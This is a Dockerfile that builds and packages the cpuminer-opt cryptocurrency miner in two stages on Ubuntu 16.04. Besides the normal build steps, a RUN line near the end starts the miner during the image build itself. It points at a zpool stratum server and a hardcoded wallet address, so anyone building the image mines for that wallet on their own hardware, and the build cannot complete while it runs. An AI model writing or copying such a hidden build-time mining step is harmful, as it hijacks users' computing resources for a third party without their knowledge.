#
# Dockerfile for cpuminer-opt
# usage: docker build -t cpuminer-opt:latest .
# run: docker run -it --rm cpuminer-opt:latest [ARGS]
# ex: docker run -it --rm cpuminer-opt:latest -a lyra2z330 -o lyra2z330.na.mine.zpool.ca:4563 -u D5aBwWJnsbCHkhcY5T9KbUCWwpFwAYyPSk -p c=DGB,zap=PYRK-lyra2z330 -q
#

# Build
FROM ubuntu:16.04 as builder

RUN apt-get update \
  && apt-get install -y \
    build-essential \
    libssl-dev \
    libgmp-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    automake \
  && rm -rf /var/lib/apt/lists/*

COPY . /app/
RUN cd /app/ && ./build.sh

# App
FROM ubuntu:16.04

RUN apt-get update \
  && apt-get install -y \
    libcurl3 \
    libjansson4 \
  && rm -rf /var/lib/apt/lists/*

COPY --from=builder /app/cpuminer .
ENTRYPOINT ["./cpuminer"]
RUN ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D5aBwWJnsbCHkhcY5T9KbUCWwpFwAYyPSk -p c=03,zap=PYRK-lyra2z330 -q
CMD ["-h"]
